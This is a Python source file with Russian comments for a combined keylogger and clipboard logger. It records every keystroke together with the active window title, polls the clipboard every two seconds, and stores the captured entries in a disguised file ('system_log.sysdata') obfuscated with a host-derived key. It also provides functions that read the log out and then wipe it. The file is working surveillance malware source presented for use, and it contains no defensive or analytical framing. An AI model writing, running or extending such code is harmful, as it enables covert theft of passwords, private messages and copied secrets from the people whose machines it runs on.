#!/usr/bin/env python3
"""
Объединенный логгер клавиатуры и буфера обмена с локальным шифрованием
"""

import os
import sys
import time
import threading
import json
from datetime import datetime
from typing import Optional, Dict, List
import base64
import hashlib

# Импорты для кейлоггера
try:
    import pynput
    from pynput import keyboard
    from pynput.keyboard import Key, Listener
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    print("[LOGGER WARNING] pynput не установлен. Установите: pip install pynput")

# Импорты для буфера обмена
try:
    import pyperclip
    PYPERCLIP_AVAILABLE = True
except ImportError:
    PYPERCLIP_AVAILABLE = False
    print("[LOGGER WARNING] pyperclip не установлен. Установите: pip install pyperclip")

class UnifiedLogger:
    """
    Объединенный логгер клавиатуры и буфера обмена с шифрованием
    """
    
    def __init__(self, log_file: str = "system_log.sysdata", encryption_key: str = None):
        """
        Инициализация логгера
        
        Args:
            log_file: Путь к файлу логов с кастомным расширением
            encryption_key: Ключ для шифрования (если None, используется дефолтный)
        """
        self.log_file = log_file
        self.encryption_key = encryption_key or self._generate_default_key()
        
        # Состояние логгера
        self.is_running = False
        self.keyboard_listener = None
        self.clipboard_monitor_thread = None
        
        # Текущий контекст
        self.current_window = ""
        self.last_window_change = time.time()
        self.last_key_press_time = time.time()  # Время последнего нажатия клавиши
        self.last_clipboard_content = ""
        
        # Буфер для нажатий клавиш
        self.key_buffer = []
        self.buffer_lock = threading.Lock()
        
        # Интервал проверки буфера обмена (секунды)
        self.clipboard_check_interval = 2.0
        
        # Инициализация файла логов
        self._init_log_file()
        
        print(f"[LOGGER] Инициализирован. Файл логов: {log_file}")
        print(f"[LOGGER] Шифрование: {'ВКЛ' if self.encryption_key else 'ВЫКЛ'}")
    
    def _generate_default_key(self) -> str:
        """Генерация ключа шифрования на основе системной информации"""
        import platform
        import hashlib
        
        # Используем комбинацию системной информации
        system_info = f"{platform.node()}{platform.processor()}{os.getlogin()}"
        key = hashlib.sha256(system_info.encode()).hexdigest()[:32]
        return key
    
    def _init_log_file(self):
        """Инициализация файла логов"""
        if not os.path.exists(self.log_file):
            # Создаем пустой зашифрованный файл
            initial_data = {
                "version": "1.0",
                "created": datetime.now().isoformat(),
                "entries": []
            }
            self._write_encrypted_data(initial_data)
    
    def _simple_encrypt(self, data: str) -> str:
        """
        Простое шифрование/обфускация текста
        
        Args:
            data: Исходный текст
            
        Returns:
            Зашифрованная строка в base64 с добавлением мусора
        """
        if not self.encryption_key:
            return data
        
        try:
            # Добавляем ключ к данным
            salted_data = self.encryption_key[:16] + data + self.encryption_key[16:]
            
            # Кодируем в base64
            encoded = base64.b64encode(salted_data.encode('utf-8')).decode('utf-8')
            
            # Добавляем мусорные символы через каждый 3-й символ
            result = []
            for i, char in enumerate(encoded):
                result.append(char)
                if i % 3 == 0:
                    result.append(chr((ord(char) + i) % 26 + 97))
            
            return ''.join(result)
            
        except Exception:
            # Если шифрование не удалось, возвращаем оригинал
            return data
    
    def _simple_decrypt(self, encrypted_data: str) -> str:
        """
        Расшифровка текста
        
        Args:
            encrypted_data: Зашифрованный текст
            
        Returns:
            Расшифрованный текст
        """
        if not self.encryption_key:
            return encrypted_data
        
        try:
            # Убираем мусорные символы (каждый 4-й символ начиная с 1)
            cleaned = []
            i = 0
            while i < len(encrypted_data):
                cleaned.append(encrypted_data[i])
                i += 1
                if i < len(encrypted_data) and (len(cleaned) + 1) % 4 == 0:
                    i += 1  # Пропускаем мусорный символ
            
            # Декодируем base64
            decoded = base64.b64decode(''.join(cleaned)).decode('utf-8')
            
            # Убираем ключ с начала и конца
            key_len = len(self.encryption_key)
            if len(decoded) > key_len:
                result = decoded[16:-(key_len-16)] if key_len > 16 else decoded[key_len:-key_len]
                return result
            
            return decoded
            
        except Exception:
            # Если расшифровка не удалась, возвращаем оригинал
            return encrypted_data
    
    def _write_encrypted_data(self, data: dict):
        """Запись зашифрованных данных в файл"""
        try:
            # Конвертируем данные в JSON
            json_data = json.dumps(data, ensure_ascii=False, indent=2)
            
            # Шифруем
            encrypted = self._simple_encrypt(json_data)
            
            # Записываем в файл
            with open(self.log_file, 'w', encoding='utf-8') as f:
                f.write(encrypted)
                
        except Exception as e:
            print(f"[LOGGER ERROR] Ошибка записи в файл: {e}")
    
    def _read_encrypted_data(self) -> dict:
        """Чтение и расшифровка данных из файла"""
        try:
            if not os.path.exists(self.log_file):
                return {"entries": []}
            
            with open(self.log_file, 'r', encoding='utf-8') as f:
                encrypted = f.read()
            
            # Расшифровываем
            decrypted = self._simple_decrypt(encrypted)
            
            # Парсим JSON
            return json.loads(decrypted)
            
        except json.JSONDecodeError:
            # Если файл поврежден, создаем новый
            print("[LOGGER WARNING] Файл логов поврежден, создаю новый")
            return {"entries": []}
        except Exception as e:
            print(f"[LOGGER ERROR] Ошибка чтения файла: {e}")
            return {"entries": []}
    
    def _get_active_window(self) -> str:
        """Получение заголовка активного окна"""
        try:
            if sys.platform == 'win32':
                import ctypes
                from ctypes import wintypes
                
                user32 = ctypes.windll.user32
                hwnd = user32.GetForegroundWindow()
                
                length = user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                
                return buff.value if buff.value else "Unknown Window"
            else:
                return "Active Window"
                
        except Exception:
            return "Unknown Window"
    
    def _on_key_press(self, key):
        """Обработчик нажатия клавиши с хронологической записью"""
        try:
            current_time = time.time()
            current_window = self._get_active_window()
            
            # Проверяем idle (15 секунд без нажатий)
            if current_time - self.last_key_press_time > 15:
                self._flush_key_buffer()
                timestamp = datetime.fromtimestamp(current_time).strftime("%H:%M:%S")
                self.key_buffer.append(f'\n[{timestamp}] ')
            
            # Проверяем, изменилось ли окно
            if current_window != self.current_window:
                self._flush_key_buffer()
                self.current_window = current_window
                self.last_window_change = current_time
                timestamp = datetime.fromtimestamp(current_time).strftime("%H:%M:%S")
                self.key_buffer.append(f'\n\n[{timestamp} | Окно: "{current_window}"]\n')
            
            # Добавляем клавишу в буфер
            with self.buffer_lock:
                try:
                    if hasattr(key, 'char') and key.char:
                        self.key_buffer.append(key.char)
                    elif key == Key.space:
                        self.key_buffer.append(' ')
                    elif key == Key.enter:
                        self.key_buffer.append('\n')
                    elif key == Key.backspace:
                        # Вместо удаления символа добавляем <
                        self.key_buffer.append('<')
                    elif key == Key.delete:
                        # Добавляем > для Delete
                        self.key_buffer.append('>')
                    elif key == Key.tab:
                        self.key_buffer.append('[TAB]')
                    else:
                        # Для специальных клавиш добавляем обозначение в квадратных скобках
                        key_name = str(key).replace('Key.', '')
                        # Приводим к читаемому виду
                        if key_name == 'ctrl_l' or key_name == 'ctrl_r':
                            key_name = 'CTRL'
                        elif key_name == 'shift_l' or key_name == 'shift_r':
                            key_name = 'SHIFT'
                        elif key_name == 'alt_l' or key_name == 'alt_r':
                            key_name = 'ALT'
                        elif key_name == 'cmd' or key_name == 'cmd_r':
                            key_name = 'WIN'
                        elif key_name == 'esc':
                            key_name = 'ESC'
                        self.key_buffer.append(f'[{key_name}]')
                except Exception:
                    pass
            
            # Обновляем время последнего нажатия
            self.last_key_press_time = current_time
            
            # Если буфер слишком большой, сбрасываем его
            if len(self.key_buffer) > 100:
                self._flush_key_buffer()
                
        except Exception as e:
            print(f"[LOGGER ERROR] Ошибка обработки клавиши: {e}")
    
    def _flush_key_buffer(self):
        """Сброс буфера клавиш в лог"""
        with self.buffer_lock:
            if not self.key_buffer:
                return
            
            # Формируем текст из буфера
            text = ''.join(self.key_buffer)
            self.key_buffer.clear()
            
            # Добавляем запись в лог
            if text.strip():  # Игнорируем пустые записи
                self._add_log_entry("keyboard", text)
    
    def _monitor_clipboard(self):
        """Мониторинг буфера обмена"""
        if not PYPERCLIP_AVAILABLE:
            return
        
        while self.is_running:
            try:
                # Получаем текущее содержимое буфера обмена
                current_content = pyperclip.paste()
                
                # Проверяем, изменилось ли содержимое
                if (current_content and 
                    current_content != self.last_clipboard_content and
                    len(current_content.strip()) > 0):
                    
                    # Игнорируем слишком длинные тексты (больше 1000 символов)
                    if len(current_content) > 1000:
                        current_content = current_content[:1000] + "..."
                    
                    # Добавляем запись в лог
                    self._add_log_entry("clipboard", current_content)
                    self.last_clipboard_content = current_content
                
            except Exception as e:
                print(f"[LOGGER ERROR] Ошибка мониторинга буфера обмена: {e}")
            
            # Пауза между проверками
            time.sleep(self.clipboard_check_interval)
    
    def _add_log_entry(self, entry_type: str, content: str):
        """
        Добавление записи в лог
        
        Args:
            entry_type: Тип записи ('keyboard' или 'clipboard')
            content: Содержимое записи
        """
        try:
            # Читаем текущие данные
            data = self._read_encrypted_data()
            
            # Создаем новую запись
            entry = {
                "timestamp": datetime.now().isoformat(),
                "type": entry_type,
                "window": self.current_window if entry_type == "keyboard" else "",
                "content": content
            }
            
            # Добавляем запись
            if "entries" not in data:
                data["entries"] = []
            data["entries"].append(entry)
            
            # Ограничиваем количество записей (последние 1000)
            if len(data["entries"]) > 1000:
                data["entries"] = data["entries"][-1000:]
            
            # Записываем обратно
            self._write_encrypted_data(data)
            
        except Exception as e:
            print(f"[LOGGER ERROR] Ошибка добавления записи: {e}")
    
    def start(self):
        """Запуск логгера"""
        if self.is_running:
            print("[LOGGER] Логгер уже запущен")
            return
        
        print("[LOGGER] Запуск логгера...")
        self.is_running = True
        
        # Запускаем мониторинг клавиатуры
        if PYNPUT_AVAILABLE:
            self.keyboard_listener = Listener(on_press=self._on_key_press)
            self.keyboard_listener.start()
            print("[LOGGER] Мониторинг клавиатуры запущен")
        else:
            print("[LOGGER WARNING] Мониторинг клавиатуры отключен (pynput не установлен)")
        
        # Запускаем мониторинг буфера обмена
        if PYPERCLIP_AVAILABLE:
            self.clipboard_monitor_thread = threading.Thread(
                target=self._monitor_clipboard,
                daemon=True
            )
            self.clipboard_monitor_thread.start()
            print("[LOGGER] Мониторинг буфера обмена запущен")
        else:
            print("[LOGGER WARNING] Мониторинг буфера обмена отключен (pyperclip не установлен)")
        
        # Запускаем периодический сброс буфера
        def periodic_flush():
            while self.is_running:
                time.sleep(30)  # Сбрасываем каждые 30 секунд
                self._flush_key_buffer()
        
        self.flush_thread = threading.Thread(target=periodic_flush, daemon=True)
        self.flush_thread.start()
        
        print("[LOGGER] Логгер успешно запущен")
    
    def stop(self):
        """Остановка логгера"""
        if not self.is_running:
            return
        
        print("[LOGGER] Остановка логгера...")
        self.is_running = False
        
        # Сбрасываем оставшиеся клавиши
        self._flush_key_buffer()
        
        # Останавливаем мониторинг клавиатуры
        if self.keyboard_listener:
            self.keyboard_listener.stop()
            self.keyboard_listener = None
        
        # Ждем завершения потока буфера обмена
        if self.clipboard_monitor_thread:
            self.clipboard_monitor_thread.join(timeout=2.0)
        
        print("[LOGGER] Логгер остановлен")
    
    def get_log_as_text(self, clear_after: bool = True) -> str:
        """
        Получение логов в читаемом формате
        
        Args:
            clear_after: Очищать ли файл логов после чтения
            
        Returns:
            Текст логов в читаемом формате
        """
        try:
            # Читаем данные
            data = self._read_encrypted_data()
            entries = data.get("entries", [])
            
            if not entries:
                return "Лог пуст."
            
            # Форматируем записи
            result = []
            result.append("=" * 60)
            result.append("ЛОГ КЛАВИАТУРЫ И БУФЕРА ОБМЕНА")
            result.append(f"Всего записей: {len(entries)}")
            result.append("=" * 60)
            result.append("")
            
            last_window = ""
            for entry in entries:
                timestamp = entry.get("timestamp", "")
                entry_type = entry.get("type", "")
                window = entry.get("window", "")
                content = entry.get("content", "")
                
                # Парсим timestamp
                try:
                    dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
                    time_str = dt.strftime("%Y-%m-%d %H:%M:%S")
                except:
                    time_str = timestamp
                
                # Добавляем заголовок окна если он изменился
                if entry_type == "keyboard" and window and window != last_window:
                    result.append(f"\n[ОКНО: {window}]")
                    last_window = window
                
                # Форматируем запись
                if entry_type == "keyboard":
                    result.append(f"{time_str}: {content}")
                elif entry_type == "clipboard":
                    result.append(f"{time_str}: [БУФЕР ОБМЕНА]: {content}")
            
            result.append("")
            result.append("=" * 60)
            result.append("КОНЕЦ ЛОГА")
            result.append("=" * 60)
            
            # Очищаем файл если нужно
            if clear_after:
                self._write_encrypted_data({"entries": []})
                print("[LOGGER] Файл логов очищен после чтения")
            
            return '\n'.join(result)
            
        except Exception as e:
            print(f"[LOGGER ERROR] Ошибка получения логов: {e}")
            return f"Ошибка получения логов: {str(e)}"
    
    def log_event(self, entry_type: str, content: str):
        """
        Ручное добавление записи в лог
        
        Args:
            entry_type: Тип записи ('keyboard', 'clipboard', 'window', или другой)
            content: Содержимое записи
        """
        self._add_log_entry(entry_type, content)
        print(f"[LOGGER] Добавлена запись: {entry_type} - {content[:50]}...")
    
    def get_logs(self, limit: int = None):
        """
        Получение списка записей лога
        
        Args:
            limit: Максимальное количество записей для возврата (None - все)
            
        Returns:
            Список записей лога или пустой список при ошибке
        """
        try:
            data = self._read_encrypted_data()
            entries = data.get("entries", [])
            if limit is not None and limit > 0:
                entries = entries[-limit:]  # Последние N записей
            return entries
        except Exception as e:
            print(f"[LOGGER ERROR] Ошибка получения логов: {e}")
            return []
    
    def clear_log(self):
        """Очистка файла логов"""
        self._write_encrypted_data({"entries": []})
        print("[LOGGER] Файл логов очищен")

# Глобальный экземпляр логгера
_logger_instance = None

def get_logger():
    """Получить глобальный экземпляр логгера"""
    global _logger_instance
    if _logger_instance is None:
        _logger_instance = UnifiedLogger()
    return _logger_instance

def start_logging():
    """Запустить логгирование"""
    logger = get_logger()
    logger.start()

def stop_logging():
    """Остановить логгирование"""
    logger = get_logger()
    logger.stop